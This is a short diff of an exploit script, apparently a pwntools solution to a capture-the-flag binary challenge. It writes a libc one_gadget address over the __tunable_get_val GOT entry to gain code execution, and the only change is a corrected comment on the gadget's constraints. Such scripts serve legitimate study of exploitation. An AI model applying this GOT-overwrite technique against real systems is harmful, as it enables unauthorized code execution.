@@ -40,7 +40,7 @@ p.sendafter(b"First chance: ", p64(first_value))
 
 # Second write
 second_addr = libc.address + 0x219178  # __tunable_get_val@got
-second_value = libc.address + 0xEBDAF  # one_gadget -> rax = NULL && [rbp-0x70] == NULL
+second_value = libc.address + 0xEBDAF  # one_gadget -> rax == NULL && [rbp-0x70] == NULL
 p.sendlineafter(b">> ", str(second_addr).encode())
 p.sendafter(b"Second chance: ", p64(second_value))
 
